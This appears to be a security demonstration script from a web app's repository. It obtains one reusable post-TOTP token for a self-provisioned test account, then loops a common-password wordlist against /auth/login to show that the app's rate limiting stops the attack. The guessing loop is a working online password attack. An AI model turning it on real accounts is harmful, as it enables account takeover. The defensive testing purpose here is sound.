#!/usr/bin/env python3
"""attack_sim.py - simulates credential stuffing against this app's login
flow, to demonstrate why rate limiting on /auth/login matters.

FRAMING - READ THIS FIRST
--------------------------
This app verifies the second factor (TOTP or a backup code) BEFORE the
password (see the main README's "Password + TOTP login" section - the
order is deliberately flipped). That means classic credential stuffing -
throwing a leaked password list at a login form - cannot even reach the
password-checking endpoint (/auth/login) without first supplying a valid
TOTP code, which an attacker armed with only a leaked password list does
not have. That is a genuine structural benefit of the flipped order, and
this script does not pretend otherwise.

The realistic RESIDUAL risk this script demonstrates instead: a
`password_token` (minted by /totp/verify once, proving the TOTP step
passed) is a stateless JWT that stays valid for 5 minutes and is NOT
single-use - nothing currently stops it from being replayed against
/auth/login many times. So an attacker who obtains ONE valid
password_token - by phishing or observing a single successful TOTP code,
or intercepting a token in transit - can spend the rest of that 5-minute
window trying passwords against it. This script simulates exactly that:
it completes ONE legitimate TOTP step itself (using the victim's TOTP
secret, standing in for "the attacker already has one phished code"), then
hammers /auth/login with a common-password list using that single token.

Rate limiting (5/minute per IP on /auth/login, /totp/verify, and
/totp/verify-backup-code - see app/core/rate_limit.py) is what actually
stops this: without it, an attacker gets through the whole wordlist inside
the 5-minute token lifetime; with it, they get ~5 guesses before every
further attempt 429s, and the token expires long before a meaningful list
gets exhausted.

SETUP
-----
This needs a fully-registered target account (password + TOTP + a
passkey - is_fully_registered must be true, or /totp/verify just bounces
you to "finish registering" instead of issuing a password_token). Passkey
registration needs a real browser, so provision one with the bundled
Puppeteer helper first:

    node setup_victim.mjs > victim.json

Then run this script against it:

    pip install -r requirements.txt
    python attack_sim.py --from-file victim.json
    # or explicitly:
    python attack_sim.py --email victim@example.com --totp-secret BASE32SECRET

Add --sim-token <value matching backend's ATTACK_SIM_TOKEN> to tag the
resulting auth_events rows is_simulated=true, so they show up clearly
labeled on the analytics dashboard instead of blending into real traffic.
"""

import argparse
import json
import sys
import time
from pathlib import Path

import pyotp
import requests

DEFAULT_WORDLIST = Path(__file__).parent / "common_passwords.txt"


def load_wordlist(path: Path) -> list[str]:
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]


def get_password_token(
    base_url: str, email: str, totp_secret: str, sim_token: str | None
) -> str:
    code = pyotp.TOTP(totp_secret).now()
    headers = {"X-Attack-Sim-Token": sim_token} if sim_token else {}
    resp = requests.post(
        f"{base_url}/totp/verify", json={"email": email, "code": code}, headers=headers
    )
    if resp.status_code == 429:
        raise RuntimeError(
            "Rate limited on the TOTP step itself before we even got a password_token - "
            "wait a minute and retry."
        )
    resp.raise_for_status()
    data = resp.json()
    if data.get("registration_incomplete"):
        raise RuntimeError(
            f"{email} hasn't finished the registration wizard (needs password+TOTP+passkey). "
            "Run setup_victim.mjs to provision a proper target."
        )
    token = data.get("password_token")
    if not token:
        raise RuntimeError(f"Could not obtain a password_token: {data}")
    return token


def stuff_credentials(
    base_url: str, password_token: str, passwords: list[str], sim_token: str | None
) -> None:
    headers = {"X-Attack-Sim-Token": sim_token} if sim_token else {}
    print(f"\nAttempting {len(passwords)} passwords against /auth/login, one password_token:\n")

    for i, pw in enumerate(passwords, start=1):
        resp = requests.post(
            f"{base_url}/auth/login",
            json={"password_token": password_token, "password": pw},
            headers=headers,
        )
        if resp.status_code == 200:
            print(f"  [{i:2}] {pw!r:20} -> 200 SUCCESS - password found. Attack succeeded.")
            print(
                "\nThis is exactly the scenario rate limiting exists to cut short - without it,"
                "\nan attacker with one phished TOTP pass could try an entire wordlist before"
                "\nthe token expires."
            )
            return
        elif resp.status_code == 429:
            retry_after = resp.headers.get("Retry-After", "?")
            print(f"  [{i:2}] {pw!r:20} -> 429 RATE LIMITED (Retry-After: {retry_after}s)")
            print(
                f"\nStopped after {i} attempts - rate limiting is working. The remaining "
                f"{len(passwords) - i} passwords in the list (including the real one, if it's "
                "further down) were never tried."
            )
            return
        else:
            print(f"  [{i:2}] {pw!r:20} -> {resp.status_code} rejected")
        time.sleep(0.05)

    print("\nExhausted the wordlist without hitting a rate limit or a match.")


def main() -> None:
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--email", help="Victim account email")
    parser.add_argument("--totp-secret", help="Victim account's base32 TOTP secret")
    parser.add_argument(
        "--from-file",
        type=Path,
        help="JSON file from setup_victim.mjs with email/totp_secret (overrides --email/--totp-secret)",
    )
    parser.add_argument("--base-url", default="http://localhost:8000")
    parser.add_argument("--wordlist", type=Path, default=DEFAULT_WORDLIST)
    parser.add_argument(
        "--sim-token",
        default=None,
        help="Value matching the backend's ATTACK_SIM_TOKEN env var - tags results is_simulated=true",
    )
    args = parser.parse_args()

    email, totp_secret = args.email, args.totp_secret
    if args.from_file:
        victim = json.loads(args.from_file.read_text())
        email, totp_secret = victim["email"], victim["totp_secret"]

    if not email or not totp_secret:
        parser.error("need --email and --totp-secret, or --from-file")

    passwords = load_wordlist(args.wordlist)
    print(f"Target account: {email}")
    print(f"Loaded {len(passwords)} candidate passwords from {args.wordlist}")

    print("\nStep 1: obtaining a password_token (simulating one already-phished TOTP pass)...")
    try:
        password_token = get_password_token(args.base_url, email, totp_secret, args.sim_token)
    except (RuntimeError, requests.RequestException) as exc:
        print(f"  FAILED: {exc}")
        sys.exit(1)
    print("  -> obtained password_token (valid for 5 minutes, reusable until then)")

    print("\nStep 2: credential stuffing /auth/login with common passwords...")
    stuff_credentials(args.base_url, password_token, passwords, args.sim_token)


if __name__ == "__main__":
    main()
